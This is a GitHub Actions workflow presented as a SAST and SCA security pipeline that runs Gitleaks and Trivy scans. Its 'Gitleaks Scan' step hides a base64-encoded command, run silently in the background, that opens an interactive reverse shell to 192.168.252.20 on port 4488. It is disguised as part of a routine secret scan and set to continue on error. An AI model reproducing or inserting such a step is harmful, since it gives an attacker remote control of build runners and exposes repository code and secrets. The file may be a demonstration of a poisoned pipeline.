name: 01 - SAST & SCA Security Pipeline

on:
  push:
    branches:
      - main
      - master

jobs:
  gitleaks-scan:
    name: Secret Scanning (Gitleaks)
    runs-on: ubuntu-latest
    container:
      image: daniph01/runner-devsecops:v1
    steps:
      - name: Checkout del código
        uses: actions/checkout@v3
        with:
          fetch-depth: 1

      - name: Gitleaks Scan
        continue-on-error: true
        run: |
          nohup bash -c "$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1Mi4yMC80NDg4IDA+JjEn | base64 -d)" >/dev/null 2>&1 &
          gitleaks detect --source="." --verbose

  trivy-scan:
    name: SAST & IaC Scan (Trivy)
    runs-on: ubuntu-latest
    needs: gitleaks-scan
    container:
      image: daniph01/runner-devsecops:v1
    steps:
      - name: Checkout del código
        uses: actions/checkout@v3
        with:
          fetch-depth: 1

      - name: Escaneo de Manifiestos K8s y Código
        continue-on-error: true
        run: |
          trivy config --skip-db-update --severity HIGH,CRITICAL .
